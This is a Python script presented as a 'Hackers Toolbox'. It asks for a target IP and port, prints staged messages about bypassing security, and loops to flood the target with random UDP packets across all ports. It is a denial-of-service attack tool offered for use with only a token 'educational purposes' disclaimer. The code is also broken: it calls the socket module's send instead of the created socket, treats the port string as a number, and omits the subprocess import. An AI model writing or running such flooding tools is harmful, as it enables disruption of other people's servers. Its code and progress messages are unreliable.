import sys
import os
import time
import socket
import random
import colorama
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
from colorama import Fore, Back, Style

def anone(ano):
    if ano == "y":
        subprocess.call(["python","main.py"])
    elif ano == "yes":
        subprocess.call(["python","main.py"])
    elif ano == "Y":
        subprocess.call(["python","main.py"])
    elif ano == "Yes":
        subprocess.call(["python","main.py"])
    else:
        print("Goodbye and see you later.")
        exit()

def vycistit():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
        
def hlavni_cast():
    print(Style.RESET_ALL + "╔═════════════════════════════════════════════════════════════════════╗")
    print("║" + Fore.GREEN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.RED + "....................." + Style.RESET_ALL + "Welcome in Hackers Toolbox" + Fore.RED + "......................" + Style.RESET_ALL + "║")
    print("║" + Fore.GREEN + "........................" + Style.RESET_ALL + "Created by: Danb1551" + Fore.GREEN + "........................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + ".........................." + Style.RESET_ALL + "Web: TERMUX.WZ.CZ" + Fore.BLUE + ".........................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "......................" + Style.RESET_ALL + "Instagram: hackit.121212" + Fore.MAGENTA + "......................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "..................." + Style.RESET_ALL + "E-mail: hackit.121212@gmail.com" + Fore.CYAN + "..................." + Style.RESET_ALL + "║")
    print("║" + Fore.RED + "...................." + Style.RESET_ALL + "ONLY FOR EDUCATIONAL PURPOSES" + Fore.RED + "...................." + Style.RESET_ALL + "║")
    print("║" + Fore.GREEN + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.BLUE + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.MAGENTA + "....................................................................." + Style.RESET_ALL + "║")
    print("║" + Fore.CYAN + "....................................................................." + Style.RESET_ALL + "║")
    print("╚═════════════════════════════════════════════════════════════════════╝")

vycistit()
hlavni_cast()
time.sleep(0.25)

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

vycistit()
hlavni_cast()
ip = input("IP Target               : ")
port = input("Port(I prefer 80)       : ")
vycistit()
#print ("\033[92m")
print (Fore.RED + "________________TRYING TO REACH THE SERVER_____________________")
time.sleep(2)
print (Fore.RED + "_________________ESTABLISHING CONNECTION_______________________")
time.sleep(2)
print (Fore.RED + "_________0100100 BYPASSING SECURITY LAYER 001010_______________")
time.sleep(2)
print (Fore.RED + "_________________CONNECTION ESTABLISHED________________________")
time.sleep(2)
print ("    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
time.sleep(1)
sent = 0
while True:
     socket.send(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1